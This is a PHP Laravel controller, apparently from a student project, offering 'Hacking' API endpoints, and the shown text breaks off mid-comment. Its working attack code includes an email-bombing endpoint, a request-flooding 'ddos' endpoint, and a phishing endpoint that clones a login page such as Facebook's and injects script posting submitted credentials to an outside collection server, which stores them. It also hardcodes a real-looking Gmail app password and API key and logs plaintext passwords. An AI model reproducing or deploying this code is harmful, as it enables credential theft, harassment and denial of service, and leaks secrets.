<?php

namespace App\Http\Controllers;

use App\Models\Log;
use App\Models\Droit;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\PHPMailer;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use GuzzleHttp\Exception\RequestException;
use Faker\Factory as Faker;
use App\Http\Controllers\Controller;


class HackController extends Controller
{

    function checkRules($fonctionnalite_id, $current_role_id)
    {
        //verifier que l'utilisateur a le droit d'acceder à la fonctionnalité
        try {
            $droit = Droit::where('fonctionnalite_id', $fonctionnalite_id)->first();
            if (!$droit) {
                return true;
            } else {
                if ($droit->role_id == $current_role_id) {
                    return true;
                } else if ($droit->role_id < $current_role_id) {
                    return false;
                }
            }
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de la vérification des droits ' . $e], 500);
        }
    }

    /**
     * @OA\Get(
     *     path="/api/emailChecker/{email}",
     *     summary="Vérifie un email avec l'API Hunter.io",
     *     description="Cette méthode vérifie si un email est valide et retourne un score de validité en utilisant l'API Hunter.io.",
     *     operationId="emailChecker",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\Parameter(
     *         name="email",
     *         in="path",
     *         description="L'adresse email à vérifier",
     *         required=true,
     *         @OA\Schema(
     *             type="string",
     *             format="email"
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Résultat de la vérification de l'email",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="email", type="string", description="Adresse email vérifiée"),
     *             @OA\Property(property="score", type="string", description="Score de validité de l'email (en pourcentage)"),
     *             @OA\Property(property="status", type="string", description="Statut de l'email ('valid', 'invalid', etc.)")
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Erreur de validation de l'email ou erreur spécifique de l'API Hunter.io",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Détail de l'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur serveur",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     )
     * )
     */
    public function emailChecker($email)
    {
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(4, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        try {
            $client = new Client();
            $url = 'https://api.hunter.io/v2/email-verifier?email=' . $email . '&api_key=a408bf05f8c0b21d39120be64204a5265b1db4a6';

            // Valider le format de l'email avant d'envoyer la requête
            if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return response()->json(['error' => 'Adresse email invalide'], 400);
            }

            // Envoyer la requête GET à l'API Hunter.io
            $response = $client->request('GET', $url);

            // Vérifier si la réponse est correcte (statut 200)
            if ($response->getStatusCode() !== 200) {
                return response()->json(['error' => 'Erreur de l\'API Hunter: ' . $response->getStatusCode()], 500);
            }

            // Décoder la réponse JSON
            $data = json_decode($response->getBody(), true);

            if (isset($data['errors'])) {
                // Gérer les erreurs spécifiques de l'API Hunter.io
                return response()->json(['error' => 'Erreur API Hunter: ' . $data['errors'][0]['details']], 400);
            }

            // Extraire les informations nécessaires
            $result = [
                'email' => $data['data']['email'] ?? null,
                'score' => isset($data['data']['score']) ? $data['data']['score'] . '%' : null,
                'status' => $data['data']['status'] ?? null,
            ];

            // Enregistrer le log de l'utilisateur
            try {
                Log::create([
                    'utilisateur_id' => $user->id,
                    'fonctionnalite_id' => 4, // ID de la fonctionnalité
                    'description_action' => "email Check on :" . $data['data']['email']
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
            }

            // Retourner les informations extraites
            return response()->json($result);
        } catch (RequestException $e) {
            if ($e->hasResponse()) {
                // Gérer les erreurs HTTP spécifiques
                $statusCode = $e->getResponse()->getStatusCode();
                $errorMessage = $e->getResponse()->getBody()->getContents();
                return response()->json(['error' => 'Erreur API Hunter: ' . $statusCode . ' - ' . $errorMessage], $statusCode);
            }

            // Autres erreurs de requête
            return response()->json(['error' => 'Erreur de connexion à l\'API: ' . $e->getMessage()], 500);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
        }
    }


    /**
     * @OA\Post(
     *     path="/api/spam",
     *     summary="Envoie un ou plusieurs emails",
     *     description="Cette méthode permet d'envoyer des emails en utilisant le service SMTP Gmail. Elle nécessite que l'utilisateur soit authentifié et dispose des permissions nécessaires.",
     *     operationId="envoyerEmail",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         description="Données nécessaires pour envoyer un email",
     *         @OA\JsonContent(
     *             type="object",
     *             required={"destinataire", "objet", "message", "nombreEmail"},
     *             @OA\Property(property="destinataire", type="string", format="email", description="Adresse email du destinataire"),
     *             @OA\Property(property="objet", type="string", description="Sujet de l'email"),
     *             @OA\Property(property="message", type="string", description="Contenu de l'email"),
     *             @OA\Property(property="nombreEmail", type="integer", description="Nombre d'emails à envoyer")
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Email(s) envoyé(s) avec succès",
     *         @OA\JsonContent(
     *             type="boolean",
     *             example=true
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Erreur de validation des données",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur serveur ou problème d'envoi d'email",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur")
     *         )
     *     )
     * )
     */
    function envoyerEmail(Request $request)
    {

        $user = Auth::user();

        if (!$user) {
            // Si l'utilisateur n'est pas authentifié, renvoyer une réponse avec une erreur 401
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(5, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        try {
        } catch (\Exception $e) {
            // Gérer les erreurs liées à la création du log
            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
        }

        $mail = new PHPMailer(true);
        try {
            // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';          // Serveur SMTP Gmail
            $mail->SMTPAuth   = true;
            $mail->Username   = 'berthet.robinson@gmail.com';   // Ton adresse Gmail
            $mail->Password   = 'qtsi ypwe sfph jbbb';        // Ton mot de passe ou App Password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port       = 587;                       // Port TLS pour Gmail

            // Destinataire
            $mail->setFrom('berthet.robinson@gmail.com', 'robi');  // Adresse email et nom de l'expéditeur
            $mail->addAddress($request->destinataire);                    // Ajouter un destinataire

            // Contenu de l'email
            $mail->isHTML(true);                                 // Format HTML
            $mail->Subject = $request->objet;                             // Sujet de l'email
            $mail->Body    = $request->message;                           // Contenu du message

            for ($i = 0; $i < $request->nombreEmail; $i++) {
                // Envoi de l'email
                $mail->send();
            }

            Log::create([
                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                'fonctionnalite_id' => 5,       // ID de la fonctionnalité (connexion)
                'description_action' => "envoi de " . $request->nombreEmail . " email(s) à " . $request->destinataire  // Description de l'action
            ]);

            return true;
        } catch (Exception $e) {
            // En cas d'erreur
            echo "L'email n'a pas pu être envoyé. Erreur: {$mail->ErrorInfo}";
            return false;
        }
    }

    /**
     * @OA\Post(
     *     path="/api/check-password",
     *     summary="Vérifie si un mot de passe est commun",
     *     description="Cette méthode permet de vérifier si le mot de passe fourni existe dans une liste de mots de passe courants.",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         @OA\JsonContent(
     *             required={"password"},
     *             @OA\Property(property="password", type="string", example="dragon")
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Mot de passe valide ou invalide",
     *         @OA\JsonContent(
     *             @OA\Property(property="is_common", type="boolean", example=true)
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié"
     *     )
     * )
     */
    public function checkPassword(Request $request)
    {
        // Vérifier que l'utilisateur est authentifié
        $user = Auth::user();
        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(7, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        // Valider que la requête a bien un paramètre 'password'
        $request->validate([
            'password' => 'required|string',
        ]);


        // Récupérer le mot de passe depuis la requête
        $password = $request->password;
        // URL du fichier texte brut sur GitHub
        $url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
        try {
            // Récupérer le contenu du fichier
            $response = Http::get($url);
            if ($response->failed()) {
                return response()->json(['error' => 'Erreur lors de la récupération du fichier'], 500);
            }
            // Contenu du fichier texte
            $fileContent = $response->body();
            // Découper le contenu du fichier en un tableau de mots (chaque mot sur une ligne)
            $passwordsList = explode("\n", $fileContent);
            // Vérifier si le mot de passe existe dans la liste
            $isPasswordInList = in_array(trim($password), array_map('trim', $passwordsList));
            Log::create([
                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                'fonctionnalite_id' => 7,       // ID de la fonctionnalité (connexion)
                'description_action' => "password checking sur le pwd :" . $request->password
            ]);
            // Retourner une réponse JSON avec 'true' ou 'false'
            return response()->json(['exists' => $isPasswordInList]);
        } catch (\Exception $e) {
            // Gérer les erreurs inattendues
            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
        }
    }

    /**
     * @OA\Get(
     *     path="/api/passwordGenerator",
     *     summary="Génère un mot de passe aléatoire sécurisé",
     *     description="Cette méthode génère un mot de passe aléatoire sécurisé de 16 caractères, comprenant des lettres, chiffres et symboles spéciaux. Elle nécessite une authentification et une autorisation.",
     *     operationId="generatePassword",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\Response(
     *         response=200,
     *         description="Mot de passe généré avec succès",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="password", type="string", description="Mot de passe généré")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de la génération ou de l'enregistrement du log",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function generatePassword()
    {

        $password = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?'), 0, 16);

        // Enregistrer le log de l'utilisateur
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(8, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 8, // ID de la fonctionnalité
                'description_action' => "Génération d'un mot de passe aléatoire"
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
        }

        // Retourner le mot de passe généré
        return response()->json(['password' => $password]);
    }


    /**
     * @OA\Get(
     *     path="/api/subdomains/{domain}",
     *     summary="Récupère les sous-domaines d'un domaine",
     *     description="Cette méthode permet de récupérer la liste des sous-domaines d'un domaine spécifié. L'utilisateur doit être authentifié et autorisé.",
     *     operationId="getSubdomains",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\Parameter(
     *         name="domain",
     *         in="path",
     *         required=true,
     *         description="Le domaine pour lequel récupérer les sous-domaines",
     *         @OA\Schema(
     *             type="string"
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Sous-domaines récupérés avec succès",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="subdomains", type="array", items={
     *                 @OA\Items(type="string")
     *             }, description="Liste des sous-domaines du domaine")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de l'enregistrement du log ou de la récupération des sous-domaines",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Domaine invalide",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Le domaine spécifié est invalide.")
     *         )
     *     )
     * )
     */
    public function getSubdomains($domain)
    {
        // Définis ta clé d'API SecurityTrails ici ou dans le fichier .env
        $apiKey = env('SECURITYTRAILS_API_KEY');

        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(9, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        // return response()->json($apiKey);

        // L'URL de l'API pour récupérer les sous-domaines
        $url = "https://api.securitytrails.com/v1/domain/{$domain}/subdomains";

        // Effectue la requête GET
        $response = Http::withHeaders([
            'APIKEY' => $apiKey
        ])->get($url);


        // Vérifie si la requête a réussi
        if ($response->successful()) {

            try {
                Log::create([
                    'utilisateur_id' => $user->id,
                    'fonctionnalite_id' => 9, // ID de la fonctionnalité
                    'description_action' => "recuperation des sous-domaines de :" . $domain
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
            }

            // Récupère et retourne les sous-domaines en JSON
            return response()->json($response->json());
        }

        // Gère les erreurs en cas de problème
        return response()->json([
            'error' => 'Impossible de récupérer les sous-domaines.'
        ], $response->status());
    }


    /**
     * @OA\Post(
     *     path="/api/ddos",
     *     summary="Effectue une attaque DDoS simulée",
     *     description="Cette méthode permet de simuler une attaque DDoS en envoyant un nombre défini de requêtes HTTP à une URL spécifiée. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
     *     operationId="ddos",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         description="Les données nécessaires pour simuler l'attaque DDoS",
     *         @OA\JsonContent(
     *             type="object",
     *             required={"url", "count"},
     *             @OA\Property(property="url", type="string", format="uri", description="L'URL cible de l'attaque"),
     *             @OA\Property(property="count", type="integer", description="Le nombre de requêtes à envoyer pour simuler l'attaque", example=10)
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Réponse des requêtes DDoS",
     *         @OA\JsonContent(
     *             type="array",
     *             @OA\Items(
     *                 type="object",
     *                 @OA\Property(property="request_number", type="integer", description="Numéro de la requête envoyée"),
     *                 @OA\Property(property="http_code", type="integer", description="Code HTTP retourné"),
     *                 @OA\Property(property="response", type="string", description="Réponse du serveur")
     *             )
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Paramètres invalides",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Les paramètres fournis sont invalides.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de l'enregistrement du log ou de l'exécution de la requête",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function ddos(Request $request)
    {

        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }
        if (!$this->checkRules(11, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }
        // Valider les données d'entrée
        $request->validate([
            'url' => 'required|url', // Vérifie que l'URL est valide
            'count' => 'required|integer|min:1', // Vérifie que count est un entier positif
        ]);

        $url = $request->input('url');
        $count = $request->input('count');
        $responses = [];

        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 11, // ID de la fonctionnalité
                'description_action' => "attaque ddos sur :" . $url . " avec " . $count . " requêtes"
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
        }

        // Envoie les requêtes en boucle
        for ($i = 0; $i < $count; $i++) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $output = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            // Enregistre la réponse ou le code HTTP
            $responses[] = [
                'request_number' => $i + 1,
                'http_code' => $httpCode,
                'response' => $output,
            ];
        }

        return response()->json($responses);
    }

    /**
     * @OA\Get(
     *     path="/api/generate-identity",
     *     summary="Génère une identité fictive aléatoire",
     *     description="Cette méthode génère une identité fictive aléatoire incluant un nom, un email, une adresse et un numéro de téléphone. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
     *     operationId="generateIdentity",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\Response(
     *         response=200,
     *         description="Identité générée avec succès",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="name", type="string", description="Nom généré"),
     *             @OA\Property(property="email", type="string", description="Email généré"),
     *             @OA\Property(property="address", type="string", description="Adresse générée"),
     *             @OA\Property(property="phone", type="string", description="Numéro de téléphone généré")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de l'enregistrement du log",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function generateIdentity()
    {
        // Récupérer l'utilisateur authentifié
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        if (!$this->checkRules(10, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }
        // Créer une instance de Faker
        $faker = Faker::create();

        // Générer une identité fictive
        $fakeIdentity = [
            'name' => $faker->name,
            'email' => $faker->email,
            'address' => $faker->address,
            'phone' => $faker->phoneNumber,
        ];

        // Enregistrer l'action dans les logs
        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 10, // ID de la fonctionnalité
                'description_action' => "generation d'une identité fictive : " . $fakeIdentity['name']
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
        }
        // Retourner la réponse JSON
        return response()->json($fakeIdentity);
    }


    /**
     * @OA\Post(
     *     path="/api/phishing",
     *     summary="Effectue une attaque de type phishing sur un site",
     *     description="Cette méthode permet de récupérer le contenu HTML d'un site donné, d'y injecter un script de phishing et de le renvoyer modifié. L'utilisateur doit être authentifié et autorisé à effectuer cette action.",
     *     operationId="phishing",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         description="Objet JSON contenant l'adresse du site à analyser",
     *         @OA\JsonContent(
     *             type="object",
     *             required={"adresse"},
     *             @OA\Property(property="adresse", type="string", example="https://www.facebook.com/login", description="URL du site à analyser pour l'attaque de phishing")
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Contenu HTML modifié avec succès et script injecté",
     *         @OA\JsonContent(
     *             type="string",
     *             description="HTML du site avec le script de phishing injecté"
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de l'analyse ou de l'injection du script",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function phishing(Request $request)
    {
        // Vérifier que l'utilisateur est authentifié
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        if (!$this->checkRules(12, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        // Valider que l'adresse est fournie et qu'elle est une URL valide
        $request->validate([
            'adresse' => 'required|url',
        ]);

        // Récupérer l'adresse depuis la requête
        $url = $request->adresse;

        try {
            // Effectuer une requête GET vers l'adresse donnée
            $response = Http::get($url);

            if ($response->failed()) {
                return response()->json(['error' => 'Impossible de récupérer le contenu de la page'], 500);
            }

            // Récupérer le contenu HTML de la page
            $htmlContent = $response->body();

            // Loguer l'action
            Log::create([
                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                'fonctionnalite_id' => 12,      // ID de la fonctionnalité (récupération HTML)
                'description_action' => "phishing pour le site : $url",
            ]);

            // Vérifier et attribuer un ID au formulaire si nécessaire
            $matches = [];
            preg_match('/<form([^>]*)(id="([^"]+)")?([^>]*)>/', $htmlContent, $matches);

            if (empty($matches[2])) {
                // Si aucun id n'est trouvé, générer un ID
                $htmlContent = preg_replace('/<form([^>]*)>/', '<form id="form-1"$1>', $htmlContent, 1);
                $formId = 'form-1'; // Utiliser l'ID généré
            } else {
                // Si un id est trouvé, l'extraire
                $formId = $matches[3];
            }

            // Script JS à injecter
            $script = <<<SCRIPT
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const form = document.getElementById("$formId");
            if (form) {
                form.addEventListener("submit", function (event) {
                    // Empêche le rechargement de la page
                    event.preventDefault();
    
                    // Créez un objet FormData pour récupérer les données du formulaire
                    const formData = new FormData(event.target);
    
                    const formDataObj = {};

                    formData.forEach((value, key) => {
                        formDataObj[key] = value;
                    });

                    fetch('https://robinson.berthet.angers.mds-project.fr/api/getDataFromPhishing', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({data: formDataObj, user_id:$user->id}) // Envoi de l'objet formData en tant que JSON
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Erreur lors de la requête API');
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log('Réponse de l\'API:', data);
                    })
                    .catch((error) => {
                        console.error('Erreur lors de l\'envoi des données:', error);
                    });

                });

            }
        });
    </script>
    SCRIPT;

            // Injecter le script avant </body>
            if (strpos($htmlContent, '</body>') !== false) {
                $htmlContent = str_replace('</body>', $script . '</body>', $htmlContent);
            }

            // Formater le HTML (optionnel)
            if (extension_loaded('tidy')) {
                $tidy = new \tidy();
                $config = [
                    'indent' => true,
                    'output-html' => true,
                    'wrap' => 200,
                ];
                $htmlContent = $tidy->repairString($htmlContent, $config, 'utf8');
            }

            // Retourner le HTML modifié
            return response($htmlContent)->header('Content-Type', 'text/html');
        } catch (\Exception $e) {
            // Gérer les erreurs inattendues
            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
        }
    }

    public function getDataFromPhishing(Request $request)
    {


        // Valider les données envoyées (en fonction des champs que vous attendez dans le formulaire)
        $request->validate([
            'data' => 'required|array', // Assurez-vous que les données sont bien un tableau
            'user_id' => 'required|integer', // Assurez-vous que l'ID de l'utilisateur est un entier
        ]);

        try {
            // Enregistrer les données dans la table des logs
            Log::create([
                'utilisateur_id' => $request->user_id, // L'ID de l'utilisateur
                'fonctionnalite_id' => 13,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
                'description_action' => 'Enregistrement de données : ' . json_encode($request->data), // Enregistrer les données sous forme de texte
            ]);

            // Retourner une réponse JSON confirmant l'enregistrement
            return response()->json(['success' => 'Données enregistrées avec succès'], 200);
        } catch (\Exception $e) {
            // Gérer les erreurs
            return response()->json(['error' => 'Erreur lors de l\'enregistrement des données : ' . $e->getMessage()], 500);
        }
    }


    /**
     * @OA\Get(
     *     path="/api/getRandomPerson",
     *     summary="Génère une image d'une personne aléatoire",
     *     description="Cette méthode génère une image d'une personne aléatoire en récupérant une photo depuis le site https://thispersondoesnotexist.com. Elle nécessite une authentification et une autorisation.",
     *     operationId="getRandomPerson",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\Response(
     *         response=200,
     *         description="Image de la personne aléatoire générée avec succès",
     *         @OA\MediaType(
     *             mediaType="image/jpeg"
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
     *         description="Erreur interne lors de la génération ou de l'enregistrement du log",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function getRandomPerson()
    {
        //ce site genere des personnes aleatoires https://thispersondoesnotexist.com/ retourne la dans la reponse, et loguer l'action
        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        if (!$this->checkRules(15, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }



        $response = Http::get('https://thispersondoesnotexist.com');

        try {
            Log::create([
                'utilisateur_id' => $user->id,
                'fonctionnalite_id' => 15, // ID de la fonctionnalité
                'description_action' => "generation d'une personne aléatoire (image)"
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
        }

        return response($response->body())->header('Content-Type', 'image/jpeg');
    }

    /**
     * @OA\Post(
     *     path="/api/crawlerInformation",
     *     summary="Récupère des informations via un moteur de recherche externe",
     *     description="Cette méthode effectue une recherche via l'API SerpApi, et récupère des informations basées sur la requête fournie. Elle nécessite une authentification et une autorisation appropriée.",
     *     operationId="crawlerInformation",
     *     tags={"Hacking"},
     *     security={{"bearerAuth": {}}},
     *     @OA\RequestBody(
     *         required=true,
     *         @OA\MediaType(
     *             mediaType="application/json",
     *             @OA\Schema(
     *                 type="object",
     *                 required={"search"},
     *                 @OA\Property(property="search", type="string", example="Laravel tutorial")
     *             )
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="Données récupérées et enregistrées avec succès",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="result", type="object", description="Les résultats de la recherche récupérés depuis SerpApi")
     *         )
     *     ),
     *     @OA\Response(
     *         response=401,
     *         description="Utilisateur non authentifié",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Utilisateur non authentifié")
     *         )
     *     ),
     *     @OA\Response(
     *         response=403,
     *         description="Accès interdit à la ressource",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="Interdis d'accéder à la ressource.")
     *         )
     *     ),
     *     @OA\Response(
     *         response=500,
